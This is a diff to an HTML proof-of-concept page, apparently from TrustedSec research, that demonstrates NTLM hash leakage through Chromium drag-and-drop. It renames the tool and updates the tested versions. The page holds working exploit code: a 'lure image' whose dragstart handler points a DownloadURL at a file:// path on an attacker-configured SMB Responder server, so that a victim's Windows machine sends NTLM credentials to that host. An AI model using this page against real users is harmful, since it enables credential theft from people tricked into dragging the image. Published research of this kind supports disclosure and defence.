@@ -25,7 +25,7 @@
 <body class="min-h-full flex flex-col scanlines">
   <!-- Banner / "CRT" header -->
   <header class="border-b border-green-600 py-6 px-4 text-center">
-    <h1 class="text-3xl md:text-4xl tracking-widest text-green-400 flicker select-none">[ Drag‑n‑Hash ]</h1>
+    <h1 class="text-3xl md:text-4xl tracking-widest text-green-400 flicker select-none">[ DragonHash ]</h1>
     <p class="mt-2 text-sm md:text-base text-green-300">Chromium drag‑and‑drop NTLM leakage proof‑of‑concept</p>
   </header>
 
@@ -43,7 +43,7 @@ $ #           ↓                              ↓</code></pre>
 
       <!-- IP input -->
       <section class="bg-black/80 border border-green-800 rounded-lg p-6 shadow-lg">
-        <h2 class="text-lg text-green-400 mb-2">1▸ Configure SMB lure server</h2>
+        <h2 class="text-lg text-green-400 mb-2">1▸ Configure SMB Responder server</h2>
         <form id="ipForm" class="flex flex-col sm:flex-row gap-4">
           <input type="text" id="ip" placeholder="192.168.56.1" required pattern="^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\\.|$)){4}$" class="flex-1 bg-transparent border border-green-600 focus:outline-none focus:ring-0 px-3 py-2 placeholder-green-700" />
           <button type="submit" class="border border-green-500 hover:bg-green-600 hover:text-black px-4 py-2">save</button>
@@ -55,20 +55,20 @@ $ #           ↓                              ↓</code></pre>
       <section class="bg-black/80 border border-green-800 rounded-lg p-6 shadow-lg">
         <h2 class="text-lg text-green-400 mb-2">2▸ Weaponized asset</h2>
         <div class="relative group">
-          <img id="bait" src="wallpaper.jpg" alt="Lure image" class="rounded border border-green-700 cursor-grab active:cursor-grabbing select-none mb-3" draggable="true">
+          <img id="bait" src="dragonHash.png" alt="Lure image" class="rounded border border-green-700 cursor-grab active:cursor-grabbing select-none mb-3" draggable="true">
           <p class="text-green-500 text-xs">Drag the image to your desktop, then click <span class="underline">Retry</span> in Chrome's downloads bar.</p>
         </div>
       </section>
 
       <!-- Disclaimer -->
       <section class="text-xs text-green-600 text-center">
-        PoC crafted for educational use · Tested on Chrome 124 / Edge 124 · Use responsibly.
+        PoC crafted for educational use · Tested on Chrome 137 and Windows 11· Use responsibly.
       </section>
     </div>
   </main>
 
   <footer class="border-t border-green-600 py-4 text-center text-xs text-green-600">
-    © 2025 TrustedSec Research · <a href="https://github.com/hoodoer/Drag-n-Hash" class="underline">view source</a>
+    © 2025 TrustedSec Research · <a href="https://github.com/hoodoer/DragonHash" class="underline">view source</a>
   </footer>
 
   <!-- JS behaviour -->
@@ -84,8 +84,8 @@ $ #           ↓                              ↓</code></pre>
     });
     bait.addEventListener('dragstart', e=>{
       if(!smbIP){alert('⚠️  Enter listener IP first');return;}
-      const fileUrl=`file://${smbIP}/SHARE/dragRacer.jpg`;
-      e.dataTransfer.setData('DownloadURL',`image/png:dragRacer.jpg:${fileUrl}`);
+      const fileUrl=`file://${smbIP}/SHARE/dragonHash.png`;
+      e.dataTransfer.setData('DownloadURL',`image/png:dragonHash.png:${fileUrl}`);
     });
   </script>
 </body>
